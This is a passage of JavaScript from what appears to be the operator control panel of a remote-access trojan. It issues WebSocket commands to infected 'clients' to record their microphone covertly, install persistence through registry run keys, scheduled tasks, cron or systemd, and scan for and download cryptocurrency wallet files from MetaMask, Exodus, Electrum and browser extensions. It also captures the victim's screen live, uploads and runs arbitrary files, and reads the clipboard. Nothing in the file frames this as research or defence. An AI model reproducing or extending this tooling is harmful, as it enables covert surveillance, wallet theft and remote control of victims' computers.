    });
}




openAudioRecorder() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for audio recorder', 'error');
        return;
    }
    
    document.getElementById('audioClientId').textContent = this.selectedClient;
    document.getElementById('audioModal').style.display = 'flex';
    
    this.audioRecording = false;
    this.recordingTimer = null;
    this.recordingStartTime = null;
    this.audioRecordings = [];
    this.currentAudioChunks = [];
    
    // Get audio devices
    this.refreshAudioDevices();
    
    this.addTerminalOutput(`>>> Opening audio recorder for ${this.selectedClient}`, 'system');
}

refreshAudioDevices() {
    this.ws.send(JSON.stringify({
        type: 'get_audio_devices',
        client_id: this.selectedClient
    }));
}

handleAudioDevices(data) {
    const deviceSelect = document.getElementById('audioDeviceSelect');
    deviceSelect.innerHTML = '';
    
    if (data.devices && data.devices.length > 0) {
        data.devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name;
            deviceSelect.appendChild(option);
        });
    } else {
        const option = document.createElement('option');
        option.value = '0';
        option.textContent = 'Default Microphone';
        deviceSelect.appendChild(option);
    }
}

toggleRecording() {
    if (this.audioRecording) {
        this.stopRecording();
    } else {
        this.startRecording();
    }
}

startRecording() {
    const duration = parseInt(document.getElementById('audioDuration').value) || 30;
    const device = parseInt(document.getElementById('audioDeviceSelect').value) || 0;
    
    // Validate duration
    if (duration < 5 || duration > 300) {
        alert('Duration must be between 5 and 300 seconds');
        return;
    }
    
    this.audioRecording = true;
    this.recordingStartTime = Date.now();
    this.currentAudioChunks = [];
    
    // Update UI
    const recordBtn = document.getElementById('recordBtn');
    recordBtn.classList.add('recording');
    document.getElementById('recordBtnText').textContent = 'STOP RECORDING';
    
    document.getElementById('recordVisualizer').classList.add('recording');
    document.getElementById('recordTimer').style.display = 'block';
    
    const statusDot = document.querySelector('.status-dot');
    statusDot.classList.add('recording');
    document.getElementById('recordStatusText').textContent = 'Recording...';
    
    // Send start command
    this.ws.send(JSON.stringify({
        type: 'start_audio_record',
        client_id: this.selectedClient,
        audio_duration: duration,
        audio_device: device
    }));
    
    // Start timer
    this.updateRecordingTimer(duration);
    
    this.updateAudioStatus(`Recording for ${duration} seconds...`);
}

stopRecording() {
    if (!this.audioRecording) return;
    
    this.audioRecording = false;
    
    // Update UI
    const recordBtn = document.getElementById('recordBtn');
    recordBtn.classList.remove('recording');
    document.getElementById('recordBtnText').textContent = 'START RECORDING';
    
    document.getElementById('recordVisualizer').classList.remove('recording');
    document.getElementById('recordTimer').style.display = 'none';
    
    const statusDot = document.querySelector('.status-dot');
    statusDot.classList.remove('recording');
    document.getElementById('recordStatusText').textContent = 'Stopping...';
    
    // Clear timer
    if (this.recordingTimer) {
        clearInterval(this.recordingTimer);
        this.recordingTimer = null;
    }
    
    // Send stop command
    this.ws.send(JSON.stringify({
        type: 'stop_audio_record',
        client_id: this.selectedClient
    }));
    
    this.updateAudioStatus('Stopping recording...');
}

updateRecordingTimer(maxDuration) {
    const startTime = Date.now();
    
    this.recordingTimer = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const minutes = Math.floor(elapsed / 60);
        const seconds = elapsed % 60;
        
        document.getElementById('timerValue').textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        // Update progress bar
        const progress = Math.min((elapsed / maxDuration) * 100, 100);
        document.getElementById('timerBar').style.width = progress + '%';
        
        // Auto stop at max duration
        if (elapsed >= maxDuration) {
            this.stopRecording();
        }
    }, 100);
}

handleAudioRecordStarted(data) {
    this.updateAudioStatus(`Recording started: ${data.filename}`);
    document.getElementById('recordStatusText').textContent = 'Recording...';
}

handleAudioRecordProgress(data) {
    // Update progress if needed
    if (data.progress !== undefined) {
        // Could update UI with progress
    }
}

handleAudioRecordError(data) {
    this.stopRecording();
    this.updateAudioStatus(`Recording error: ${data.error}`);
    alert(`Audio recording error: ${data.error}`);
}

handleAudioFileStart(data) {
    // Initialize download for new audio file
    this.currentAudioFile = {
        filename: data.filename,
        size: data.size,
        chunks: new Array(data.total_chunks),
        totalChunks: data.total_chunks,
        receivedChunks: 0
    };
    
    this.updateAudioStatus(`Receiving audio file: ${data.filename}`);
}

handleAudioFileChunk(data) {
    if (!this.currentAudioFile) return;
    
    // Store chunk
    this.currentAudioFile.chunks[data.chunk_index] = data.chunk_data;
    this.currentAudioFile.receivedChunks++;
    
    // Check if complete
    if (data.is_last || this.currentAudioFile.receivedChunks >= this.currentAudioFile.totalChunks) {
        this.finalizeAudioDownload();
    }
}

handleAudioRecordComplete(data) {
    document.getElementById('recordStatusText').textContent = 'Ready';
    
    if (data.success) {
        this.updateAudioStatus('Recording completed successfully');
    } else {
        this.updateAudioStatus('Recording failed');
    }
}

finalizeAudioDownload() {
    if (!this.currentAudioFile) return;
    
    // Combine chunks
    const fullData = this.currentAudioFile.chunks.join('');
    
    // Decode base64
    try {
        const binaryData = atob(fullData);
        const bytes = new Uint8Array(binaryData.length);
        for (let i = 0; i < binaryData.length; i++) {
            bytes[i] = binaryData.charCodeAt(i);
        }
        
        // Create blob
        const blob = new Blob([bytes], { type: 'audio/wav' });
        const url = URL.createObjectURL(blob);
        
        // Add to recordings list
        const recording = {
            filename: this.currentAudioFile.filename,
            size: this.currentAudioFile.size,
            timestamp: new Date(),
            url: url,
            blob: blob
        };
        
        this.audioRecordings.push(recording);
        this.updateRecordingsList();
        
        this.updateAudioStatus(`Audio saved: ${recording.filename}`);
        
    } catch (error) {
        console.error('Failed to decode audio:', error);
        this.updateAudioStatus('Failed to decode audio file');
    }
    
    this.currentAudioFile = null;
}

updateRecordingsList() {
    const listContainer = document.getElementById('recordingsList');
    
    if (this.audioRecordings.length === 0) {
        listContainer.innerHTML = '<div class="no-recordings">No recordings yet</div>';
        return;
    }
    
    listContainer.innerHTML = '';
    
    // Show recordings in reverse order (newest first)
    [...this.audioRecordings].reverse().forEach((recording, index) => {
        const item = document.createElement('div');
        item.className = 'recording-item';
        
        const sizeKB = Math.round(recording.size / 1024);
        const timeStr = recording.timestamp.toLocaleTimeString();
        
        item.innerHTML = `
            <div class="recording-info">
                <div class="recording-name">${recording.filename}</div>
                <div class="recording-details">${timeStr}  ${sizeKB} KB</div>
            </div>
            <div class="recording-actions">
                <button class="recording-btn" onclick="playAudioRecording(${this.audioRecordings.length - 1 - index})">PLAY</button>
                <button class="recording-btn" onclick="downloadAudioRecording(${this.audioRecordings.length - 1 - index})">DOWNLOAD</button>
            </div>
        `;
        
        listContainer.appendChild(item);
    });
}

playAudioRecording(index) {
    const recording = this.audioRecordings[index];
    if (!recording) return;
    
    // Create audio element and play
    const audio = new Audio(recording.url);
    audio.play().catch(error => {
        console.error('Failed to play audio:', error);
        this.updateAudioStatus('Failed to play audio');
    });
}

downloadAudioRecording(index) {
    const recording = this.audioRecordings[index];
    if (!recording) return;
    
    // Create download link
    const a = document.createElement('a');
    a.href = recording.url;
    a.download = recording.filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

updateAudioStatus(message) {
    document.getElementById('audioStatus').textContent = message;
}



openPersistenceManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for persistence manager', 'error');
        return;
    }
    
    document.getElementById('persistenceClientId').textContent = this.selectedClient;
    document.getElementById('persistenceModal').style.display = 'flex';
    
    // Show appropriate methods based on OS
    const client = this.clients.get(this.selectedClient);
    if (client) {
        if (client.os === 'Windows') {
            document.getElementById('windowsMethods').style.display = 'block';
            document.getElementById('linuxMethods').style.display = 'none';
        } else {
            document.getElementById('windowsMethods').style.display = 'none';
            document.getElementById('linuxMethods').style.display = 'block';
        }
    }
    
    // Clear log
    document.getElementById('persistenceLog').innerHTML = '';
    
    // Check current persistence status
    this.checkPersistence();
    
    this.addTerminalOutput(`>>> Opening persistence manager for ${this.selectedClient}`, 'system');
}

checkPersistence() {
    this.ws.send(JSON.stringify({
        type: 'check_persistence',
        client_id: this.selectedClient
    }));
    
    this.addPersistenceLog('Checking persistence status...', 'info');
}

handlePersistenceStatus(data) {
    const indicator = document.getElementById('persistenceIndicator');
    const mainStatus = document.getElementById('persistenceMainStatus');
    const methodsContainer = document.getElementById('installedMethods');
    
    if (data.installed) {
        indicator.className = 'status-indicator active';
        mainStatus.textContent = 'PERSISTENCE ACTIVE';
        
        // Show installed methods
        methodsContainer.innerHTML = '';
        if (data.methods && data.methods.length > 0) {
            data.methods.forEach(method => {
                const tag = document.createElement('div');
                tag.className = 'method-tag';
                tag.textContent = this.formatMethodName(method);
                methodsContainer.appendChild(tag);
            });
        }
        
        this.addPersistenceLog('Persistence is active', 'success');
    } else {
        indicator.className = 'status-indicator inactive';
        mainStatus.textContent = 'NO PERSISTENCE';
        methodsContainer.innerHTML = '<div style="color: #666; font-size: 0.9em;">No persistence methods installed</div>';
        
        this.addPersistenceLog('No persistence detected', 'info');
    }
}

installPersistence(method) {
    if (confirm(`Install persistence using ${this.formatMethodName(method)} method?`)) {
        this.ws.send(JSON.stringify({
            type: 'install_persistence',
            client_id: this.selectedClient,
            persistence_method: method
        }));
        
        this.addPersistenceLog(`Installing persistence: ${method}...`, 'info');
    }
}

removeAllPersistence() {
    if (confirm('Remove all persistence methods? This will make the client non-persistent.')) {
        this.ws.send(JSON.stringify({
            type: 'remove_persistence',
            client_id: this.selectedClient
        }));
        
        this.addPersistenceLog('Removing all persistence methods...', 'info');
    }
}

handlePersistenceResult(data) {
    const operation = data.operation || 'unknown';
    
    if (data.success) {
        if (operation === 'install') {
            this.addPersistenceLog(`Persistence installed successfully: ${data.message || 'Success'}`, 'success');
        } else if (operation === 'remove') {
            this.addPersistenceLog(`Persistence removed: ${data.message || 'Success'}`, 'success');
        }
        
        // Refresh status
        setTimeout(() => this.checkPersistence(), 1000);
    } else {
        this.addPersistenceLog(`Operation failed: ${data.message || 'Unknown error'}`, 'error');
    }
}

formatMethodName(method) {
    const names = {
        'registry': 'Registry Run Key',
        'startup_folder': 'Startup Folder',
        'scheduled_task': 'Scheduled Task',
        'service': 'Windows Service',
        'cron': 'Cron Job',
        'systemd': 'Systemd Service',
        'desktop': 'Desktop Autostart'
    };
    return names[method] || method;
}

addPersistenceLog(message, type = 'info') {
    const logContainer = document.getElementById('persistenceLog');
    const timestamp = new Date().toLocaleTimeString();
    
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span>${message}`;
    
    logContainer.appendChild(entry);
    logContainer.scrollTop = logContainer.scrollHeight;
}



openWalletScanner() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for wallet scanner', 'error');
        return;
    }
    
    document.getElementById('walletClientId').textContent = this.selectedClient;
    document.getElementById('walletModal').style.display = 'flex';
    
    this.foundWallets = [];
    this.downloadedWallets = new Set();
    this.currentWalletFilter = 'all';
    this.walletDownloadQueue = [];
    this.isDownloadingWallet = false;
    
    // Reset stats
    document.getElementById('walletsFound').textContent = '0';
    document.getElementById('walletsDownloaded').textContent = '0';
    document.getElementById('scanStatus').textContent = 'Ready';
    document.getElementById('walletResults').innerHTML = '<div class="no-results">No scan performed yet</div>';
    
    this.addTerminalOutput(`>>> Opening wallet scanner for ${this.selectedClient}`, 'system');
}

startWalletScan() {
    const scanBtn = document.getElementById('scanWalletsBtn');
    scanBtn.disabled = true;
    scanBtn.classList.add('scanning');
    scanBtn.textContent = ' SCANNING... ';
    
    this.foundWallets = [];
    this.downloadedWallets.clear();
    document.getElementById('walletsFound').textContent = '0';
    document.getElementById('walletsDownloaded').textContent = '0';
    document.getElementById('scanStatus').textContent = 'Scanning...';
    document.getElementById('walletResults').innerHTML = '<div class="loading">Scanning for crypto wallets...</div>';
    
    this.ws.send(JSON.stringify({
        type: 'scan_wallets',
        client_id: this.selectedClient
    }));
}

handleWalletScanStarted() {
    document.getElementById('scanStatus').textContent = 'Scanning...';
    this.addTerminalOutput('>>> Wallet scan started', 'system');
}

handleWalletFound(data) {
    const wallet = {
        type: data.wallet_type,
        path: data.path,
        size: data.size,
        category: data.category,
        downloaded: false
    };
    
    this.foundWallets.push(wallet);
    document.getElementById('walletsFound').textContent = data.total_found || this.foundWallets.length;
    
    // Update results in real-time
    this.updateWalletResults();
}

handleWalletScanComplete(data) {
    const scanBtn = document.getElementById('scanWalletsBtn');
    scanBtn.disabled = false;
    scanBtn.classList.remove('scanning');
    scanBtn.textContent = ' START SCAN ';
    
    document.getElementById('scanStatus').textContent = 'Scan Complete';
    document.getElementById('walletsFound').textContent = data.total_found || this.foundWallets.length;
    
    if (data.wallets) {
        // Update with complete list if provided
        this.foundWallets = data.wallets.map(path => {
            // Find existing wallet data or create new
            const existing = this.foundWallets.find(w => w.path === path);
            return existing || {
                type: this.extractWalletType(path),
                path: path,
                size: 0,
                category: this.detectWalletCategory(path),
                downloaded: false
            };
        });
    }
    
    this.updateWalletResults();
    this.addTerminalOutput(`>>> Wallet scan complete: ${this.foundWallets.length} wallets found`, 'success');
}

extractWalletType(path) {
    // Extract wallet type from path
    const pathLower = path.toLowerCase();
    
    if (pathLower.includes('metamask')) return 'MetaMask';
    if (pathLower.includes('bitcoin')) return 'Bitcoin Core';
    if (pathLower.includes('ethereum')) return 'Ethereum';
    if (pathLower.includes('electrum')) return 'Electrum';
    if (pathLower.includes('exodus')) return 'Exodus';
    if (pathLower.includes('atomic')) return 'Atomic';
    if (pathLower.includes('binance')) return 'Binance';
    if (pathLower.includes('coinbase')) return 'Coinbase';
    if (pathLower.includes('phantom')) return 'Phantom';
    if (pathLower.includes('trust')) return 'Trust Wallet';
    if (pathLower.includes('ronin')) return 'Ronin';
    if (pathLower.includes('yoroi')) return 'Yoroi';
    if (pathLower.includes('nami')) return 'Nami';
    if (pathLower.includes('jaxx')) return 'Jaxx';
    if (pathLower.includes('coinomi')) return 'Coinomi';
    if (pathLower.includes('guarda')) return 'Guarda';
    
    // Check by filename
    if (pathLower.includes('wallet.dat')) return 'Bitcoin Core';
    if (pathLower.includes('.wallet')) return 'Wallet File';
    if (pathLower.includes('keystore')) return 'Ethereum Keystore';
    
    return 'Unknown Wallet';
}

detectWalletCategory(path) {
    const pathLower = path.toLowerCase();
    
    if (pathLower.includes('local extension settings') || 
        pathLower.includes('indexeddb') || 
        pathLower.includes('chrome') || 
        pathLower.includes('brave') || 
        pathLower.includes('edge') || 
        pathLower.includes('firefox')) {
        return 'extension';
    }
    
    if (pathLower.includes('localstorage')) {
        return 'localstorage';
    }
    
    return 'desktop';
}

filterWallets(filter) {
    this.currentWalletFilter = filter;
    
    // Update filter buttons
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    this.updateWalletResults();
}

updateWalletResults() {
    const resultsContainer = document.getElementById('walletResults');
    
    if (this.foundWallets.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No wallets found</div>';
        return;
    }
    
    // Filter wallets
    let filteredWallets = this.foundWallets;
    if (this.currentWalletFilter !== 'all') {
        if (this.currentWalletFilter === 'downloaded') {
            filteredWallets = this.foundWallets.filter(w => this.downloadedWallets.has(w.path));
        } else {
            filteredWallets = this.foundWallets.filter(w => w.category === this.currentWalletFilter);
        }
    }
    
    resultsContainer.innerHTML = '';
    
    filteredWallets.forEach((wallet, index) => {
        const item = document.createElement('div');
        item.className = 'wallet-item';
        if (this.downloadedWallets.has(wallet.path)) {
            item.classList.add('downloaded');
        }
        
        const sizeText = wallet.size > 0 ? this.formatFileSize(wallet.size) : 'Unknown size';
        const isDownloaded = this.downloadedWallets.has(wallet.path);
        
        item.innerHTML = `
            <div class="wallet-details">
                <div class="wallet-type">${wallet.type}</div>
                <div class="wallet-path">${wallet.path}</div>
                <div class="wallet-meta">
                    <span class="wallet-size">${sizeText}</span>
                    <span class="wallet-category-tag">${wallet.category}</span>
                </div>
            </div>
            <div class="wallet-actions">
                <button class="wallet-action-btn ${isDownloaded ? 'downloaded' : ''}" 
                        onclick="downloadWallet(${index})" 
                        ${isDownloaded ? 'disabled' : ''}>
                    ${isDownloaded ? 'DOWNLOADED' : 'DOWNLOAD'}
                </button>
            </div>
        `;
        
        resultsContainer.appendChild(item);
    });
    
    if (filteredWallets.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No wallets match the selected filter</div>';
    }
}

downloadWallet(index) {
    const wallet = this.foundWallets[index];
    if (!wallet || this.downloadedWallets.has(wallet.path)) return;
    
    // Add to download queue
    this.walletDownloadQueue.push(wallet);
    
    // Start download if not already downloading
    if (!this.isDownloadingWallet) {
        this.processWalletDownloadQueue();
    }
}

processWalletDownloadQueue() {
    if (this.walletDownloadQueue.length === 0) {
        this.isDownloadingWallet = false;
        return;
    }
    
    this.isDownloadingWallet = true;
    const wallet = this.walletDownloadQueue.shift();
    
    // Show download progress
    document.getElementById('walletDownloadProgress').style.display = 'block';
    document.getElementById('downloadingWallet').textContent = wallet.type;
    document.getElementById('downloadProgress').textContent = '0%';
    document.getElementById('walletProgressBar').style.width = '0%';
    
    // Initialize download
    this.currentWalletDownload = {
        wallet: wallet,
        chunks: new Map(),
        totalChunks: 0
    };
    
    // Send download request
    this.ws.send(JSON.stringify({
        type: 'download_wallet',
        client_id: this.selectedClient,
        wallet_path: wallet.path
    }));
}

handleWalletDownloadStart(data) {
    if (!this.currentWalletDownload) return;
    
    this.currentWalletDownload.filename = data.filename;
    this.currentWalletDownload.size = data.size;
    this.currentWalletDownload.totalChunks = data.total_chunks;
    
    this.addTerminalOutput(`>>> Downloading wallet: ${data.filename}`, 'system');
}

handleWalletDownloadChunk(data) {
    if (!this.currentWalletDownload) return;
    
    // Store chunk
    this.currentWalletDownload.chunks.set(data.chunk_index, data.chunk_data);
    
    // Update progress
    const progress = Math.round(((data.chunk_index + 1) / data.total_chunks) * 100);
    document.getElementById('downloadProgress').textContent = `${progress}%`;
    document.getElementById('walletProgressBar').style.width = `${progress}%`;
    
    // Check if complete
    if (data.is_last || this.currentWalletDownload.chunks.size >= this.currentWalletDownload.totalChunks) {
        this.finalizeWalletDownload();
    }
}

handleWalletDownloadComplete(data) {
    if (data.success) {
        // Already handled in finalizeWalletDownload
    } else {
        this.addTerminalOutput(`>>> Wallet download failed: ${data.error}`, 'error');
        document.getElementById('walletDownloadProgress').style.display = 'none';
    }
    
    // Process next in queue
    this.processWalletDownloadQueue();
}

finalizeWalletDownload() {
    if (!this.currentWalletDownload) return;
    
    // Combine chunks
    let fullData = '';
    for (let i = 0; i < this.currentWalletDownload.totalChunks; i++) {
        if (this.currentWalletDownload.chunks.has(i)) {
            fullData += this.currentWalletDownload.chunks.get(i);
        }
    }
    
    // Decode and download
    try {
        const binaryData = atob(fullData);
        const bytes = new Uint8Array(binaryData.length);
        for (let i = 0; i < binaryData.length; i++) {
            bytes[i] = binaryData.charCodeAt(i);
        }
        
        const blob = new Blob([bytes]);
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = this.currentWalletDownload.filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        // Mark as downloaded
        this.downloadedWallets.add(this.currentWalletDownload.wallet.path);
        document.getElementById('walletsDownloaded').textContent = this.downloadedWallets.size;
        
        // Update UI
        this.updateWalletResults();
        
        this.addTerminalOutput(`>>> Wallet downloaded: ${this.currentWalletDownload.filename}`, 'success');
        
    } catch (error) {
        console.error('Failed to download wallet:', error);
        this.addTerminalOutput('>>> Failed to process wallet download', 'error');
    }
    
    // Hide progress
    document.getElementById('walletDownloadProgress').style.display = 'none';
    
    // Clear current download
    this.currentWalletDownload = null;
    
    // Process next in queue
    setTimeout(() => this.processWalletDownloadQueue(), 500);
}




            openRemoteDesktop() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for remote desktop', 'error');
                    return;
                }
                
                document.getElementById('rdpClientId').textContent = this.selectedClient;
                document.getElementById('rdpModal').style.display = 'flex';
                
                // Reset RDP state
                this.stopRemoteDesktop();
                
                this.addTerminalOutput(`>>> Opening remote desktop for ${this.selectedClient}`, 'system');
            }
            
            startRemoteDesktop() {
                if (!this.selectedClient || this.rdpActive) return;
                
                const quality = document.getElementById('rdpQuality').value;
                
                // Update UI
                document.getElementById('rdpStartBtn').disabled = true;
                document.getElementById('rdpStopBtn').disabled = false;
                document.getElementById('rdpStatus').textContent = 'CONNECTING...';
                document.getElementById('rdpStatus').className = 'rdp-status connecting';
                
                // Send start command to client with quality
                const message = {
                    type: 'start_screenshot',
                    client_id: this.selectedClient,
                    quality: quality
                };
                
                this.ws.send(JSON.stringify(message));
                this.rdpActive = true;
                
                // Start requesting screenshots with improved timing
                this.rdpInterval = setInterval(() => {
                    if (this.rdpActive && this.selectedClient) {
                        const message = {
                            type: 'get_screenshot',
                            client_id: this.selectedClient
                        };
                        this.ws.send(JSON.stringify(message));
                    }
                }, 500); // 2 FPS initially
                
                this.addTerminalOutput(`>>> Starting remote desktop for ${this.selectedClient}`, 'system');
            }
            
            stopRemoteDesktop() {
                if (this.rdpInterval) {
                    clearInterval(this.rdpInterval);
                    this.rdpInterval = null;
                }
                
                this.rdpActive = false;
                
                // Update UI
                document.getElementById('rdpStartBtn').disabled = false;
                document.getElementById('rdpStopBtn').disabled = true;
                document.getElementById('rdpStatus').textContent = 'DISCONNECTED';
                document.getElementById('rdpStatus').className = 'rdp-status disconnected';
                document.getElementById('screenImage').style.display = 'none';
                document.getElementById('screenPlaceholder').style.display = 'block';
                document.getElementById('fpsCounter').style.display = 'none';
                
                // Send stop command to client
                if (this.selectedClient) {
                    const message = {
                        type: 'stop_screenshot',
                        client_id: this.selectedClient
                    };
                    this.ws.send(JSON.stringify(message));
                }
            }
            
            updateScreenshot(data) {
                if (!this.rdpActive) return;
                
                const screenImage = document.getElementById('screenImage');
                const screenPlaceholder = document.getElementById('screenPlaceholder');
                const fpsCounter = document.getElementById('fpsCounter');
                const rdpStatus = document.getElementById('rdpStatus');
                
                if (data.success && data.data) {
                    try {
                        // Validate base64 data before creating image
                        const base64Data = data.data;
                        if (base64Data && base64Data.length > 0) {
                            // Test if it's valid base64
                            atob(base64Data.substring(0, Math.min(100, base64Data.length)));
                            
                            // Update image
                            screenImage.src = 'data:image/bmp;base64,' + base64Data;
                            screenImage.style.display = 'block';
                            screenPlaceholder.style.display = 'none';
                            fpsCounter.style.display = 'block';
                            
                            // Update status
                            rdpStatus.textContent = 'CONNECTED';
                            rdpStatus.className = 'rdp-status connected';
                            
                            // Update FPS counter
                            this.fpsCounter++;
                            const now = Date.now();
                            if (now - this.lastFpsUpdate >= 1000) {
                                fpsCounter.textContent = `FPS: ${this.fpsCounter}`;
                                this.fpsCounter = 0;
                                this.lastFpsUpdate = now;
                            }
                            
                            console.log(`[SCREENSHOT] Received valid screenshot: ${base64Data.length} chars`);
                            
                            // Adjust refresh rate based on quality
                            const quality = document.getElementById('rdpQuality').value;
                            let interval = 500; // Default 2 FPS
                            switch (quality) {
                                case 'low': interval = 400; break;   // 2.5 FPS
                                case 'medium': interval = 300; break; // 3.3 FPS
                                case 'high': interval = 200; break;   // 5 FPS
                            }
                            
                            if (this.rdpInterval) {
                                clearInterval(this.rdpInterval);
                                this.rdpInterval = setInterval(() => {
                                    if (this.rdpActive && this.selectedClient) {
                                        const message = {
                                            type: 'get_screenshot',
                                            client_id: this.selectedClient
                                        };
                                        this.ws.send(JSON.stringify(message));
                                    }
                                }, interval);
                            }
                        } else {
                            throw new Error('Empty screenshot data');
                        }
                    } catch (error) {
                        console.error('[SCREENSHOT] Invalid screenshot data:', error);
                        rdpStatus.textContent = 'DATA ERROR';
                        rdpStatus.className = 'rdp-status disconnected';
                    }
                } else {
                    // Error getting screenshot
                    console.log('[SCREENSHOT] Screenshot failed or no data');
                    rdpStatus.textContent = 'ERROR';
                    rdpStatus.className = 'rdp-status disconnected';
                }
            }
            
            openRemoteExecute() {
                if (!this.selectedClient) {
                    this.addTerminalOutput('>>> No client selected for remote execute', 'error');
                    return;
                }
                
                document.getElementById('execClientId').textContent = this.selectedClient;
                document.getElementById('execModal').style.display = 'flex';
                
                // Reset state
                this.resetExecModal();
                
                this.addTerminalOutput(`>>> Opening remote execute for ${this.selectedClient}`, 'system');
            }
            
            resetExecModal() {
                this.selectedFile = null;
                this.uploadedFileName = null;
                document.getElementById('fileInput').value = '';
                document.getElementById('fileInfo').textContent = 'No file selected (Max: 50MB)';
                document.getElementById('progressSection').style.display = 'none';
                document.getElementById('progressBar').style.width = '0%';
                document.getElementById('progressText').textContent = '0%';
                document.getElementById('uploadBtn').disabled = true;
                document.getElementById('executeBtn').disabled = true;
                document.getElementById('execOutput').innerHTML = ` EXECUTION OUTPUT \n\nReady to upload and execute files...`;
            }
            
            handleFileSelect(event) {
                const file = event.target.files[0];
                if (!file) return;
                
                const maxSize = 50 * 1024 * 1024; // 50MB
                
                if (file.size > maxSize) {
                    this.addExecOutput(`ERROR: File too large (${(file.size / 1024 / 1024).toFixed(2)}MB). Max size is 50MB.`, 'error');
                    event.target.value = '';
                    return;
                }
                
                this.selectedFile = file;
                document.getElementById('fileInfo').textContent = `Selected: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)}MB)`;
                document.getElementById('uploadBtn').disabled = false;
                this.addExecOutput(`File selected: ${file.name}`);
            }
            
            async uploadFile() {
                if (!this.selectedFile || !this.selectedClient) return;
                
                const uploadBtn = document.getElementById('uploadBtn');
                const executeBtn = document.getElementById('executeBtn');
                const progressSection = document.getElementById('progressSection');
                
                uploadBtn.disabled = true;
                executeBtn.disabled = true;
                progressSection.style.display = 'block';
                
                // Reset button text
                uploadBtn.textContent = ' UPLOADING... ';
                
                this.addExecOutput(`\nStarting upload of ${this.selectedFile.name}...`);
                
                // Read file as base64
                const reader = new FileReader();
                reader.onload = async (e) => {
                    const base64Data = e.target.result.split(',')[1]; // Remove data:type;base64, prefix
                    const chunkSize = 512 * 1024; // 512KB chunks
                    const totalChunks = Math.ceil(base64Data.length / chunkSize);
                    
                    this.uploadedFileName = this.selectedFile.name;
                    
                    // Send file info first
                    this.ws.send(JSON.stringify({
                        type: 'file_upload_start',
                        client_id: this.selectedClient,
                        filename: this.selectedFile.name,
                        filesize: this.selectedFile.size,
                        total_chunks: totalChunks
                    }));
                    
                    // Upload chunks
                    for (let i = 0; i < totalChunks; i++) {
                        const chunk = base64Data.slice(i * chunkSize, (i + 1) * chunkSize);
                        const progress = Math.round(((i + 1) / totalChunks) * 100);
                        
                        this.updateProgress(progress);
                        
                        await this.sendFileChunk(i, chunk, i === totalChunks - 1);
                        
                        // Small delay between chunks
                        await new Promise(resolve => setTimeout(resolve, 25));
                    }
                };
                
                reader.readAsDataURL(this.selectedFile);
            }
            
            async sendFileChunk(chunkIndex, chunkData, isLast) {
                return new Promise((resolve) => {
                    this.ws.send(JSON.stringify({
                        type: 'file_chunk',
                        client_id: this.selectedClient,
                        chunk_index: chunkIndex,
                        chunk_data: chunkData,
                        is_last: isLast
                    }));
                    
                    // Simple timeout to pace uploads
                    setTimeout(resolve, 5);
                });
            }
            
            updateProgress(percent) {
                document.getElementById('progressBar').style.width = percent + '%';
                document.getElementById('progressText').textContent = percent + '%';
            }
            
            handleFileChunkAck(data) {
                // Server acknowledged chunk receipt
                if (data.chunk_index !== undefined) {
                    console.log(`Chunk ${data.chunk_index} acknowledged`);
                }
            }
            
           handleFileUploadComplete(data) {
                const uploadBtn = document.getElementById('uploadBtn');
                const executeBtn = document.getElementById('executeBtn');
                
                if (data.success) {
                    this.addExecOutput(`\nUpload complete! File saved as: ${data.filename}`, 'success');
                    
                    // Enable both buttons
                    executeBtn.disabled = false;
                    uploadBtn.disabled = false;
                    uploadBtn.textContent = ' UPLOAD ANOTHER FILE ';
                    
                    // Keep the uploaded filename for execution
                    this.uploadedFileName = data.filename;
                    
                    console.log(`Upload completed: ${data.filename}, execute button enabled: ${!executeBtn.disabled}`);
                } else {
                    this.addExecOutput(`\nUpload failed: ${data.error || 'Unknown error'}`, 'error');
                    uploadBtn.disabled = false;
                    uploadBtn.textContent = ' RETRY UPLOAD ';
                    executeBtn.disabled = true;
                }
                
                // Hide progress section
                document.getElementById('progressSection').style.display = 'none';
            }
            
            executeFile() {
                if (!this.uploadedFileName || !this.selectedClient) return;
                
                document.getElementById('executeBtn').disabled = true;
                this.addExecOutput(`\n`);
                this.addExecOutput(`Executing ${this.uploadedFileName}...`);
                this.addExecOutput(`\n`);
                
                this.ws.send(JSON.stringify({
                    type: 'execute_file',
                    client_id: this.selectedClient,
                    filename: this.uploadedFileName
                }));
            }
            
            handleExecuteResponse(data) {
                if (data.output) {
                    this.addExecOutput(`\nExecution output:\n${data.output}`, data.success ? 'success' : 'error');
                }
                
                if (data.completed) {
                    this.addExecOutput(`\nExecution completed with exit code: ${data.exit_code}`);
                    document.getElementById('executeBtn').disabled = false;
                }
            }
            
            addExecOutput(text, type = 'normal') {
                const output = document.getElementById('execOutput');
                const timestamp = new Date().toLocaleTimeString();
                let color = '#00ff00';
                
                if (type === 'error') color = '#ff0000';
                if (type === 'success') color = '#00ffff';
                
                output.innerHTML += `\n<span style="color: #666">[${timestamp}]</span> <span style="color: ${color}">${text}</span>`;
                output.scrollTop = output.scrollHeight;
            }


            openClipboardManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for clipboard manager', 'error');
        return;
    }
    
    document.getElementById('clipboardClientId').textContent = this.selectedClient;
    document.getElementById('clipboardModal').style.display = 'flex';
    
    // Initialize clipboard history
    this.clipboardHistory = [];
    this.clipboardMonitoring = false;
    
    this.addTerminalOutput(`>>> Opening clipboard manager for ${this.selectedClient}`, 'system');
}

getClipboard() {
    this.ws.send(JSON.stringify({
        type: 'get_clipboard',
        client_id: this.selectedClient
    }));
}

